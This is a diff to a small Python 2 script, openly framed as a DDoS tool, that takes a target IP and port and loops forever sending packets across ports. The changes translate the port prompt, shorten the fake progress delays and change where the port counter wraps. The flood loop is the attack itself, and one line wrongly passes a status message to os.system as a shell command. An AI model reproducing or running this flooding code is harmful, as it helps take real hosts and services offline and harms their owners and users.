@@ -29,18 +29,18 @@ print "|____/|_____/ \___/|___/     /_/   \_\__|\__\__,_|\___|_|\_\             
 
 print
 ip = raw_input("IP : ")
-port = input("port : ")
+port = input("duankou : ")
 
 os.system("clear")
 os.system("The DDos is starting")
 print "[                    ] 0% "
-time.sleep(5)
+time.sleep(3)
 print "[=====               ] 25%"
-time.sleep(5)
+time.sleep(3)
 print "[==========          ] 50%"
-time.sleep(5)
+time.sleep(3)
 print "[===============     ] 75%"
-time.sleep(5)
+time.sleep(3)
 print "[====================] 100%"
 time.sleep(3)
 sent = 0
@@ -49,6 +49,6 @@ while True:
      sent = sent + 1
      port = port + 1
      print "Send %s packet to %s throught port :%s"%(sent,ip,port)
-     if port == 65534:
+     if port == 1464:
        port = 1
 
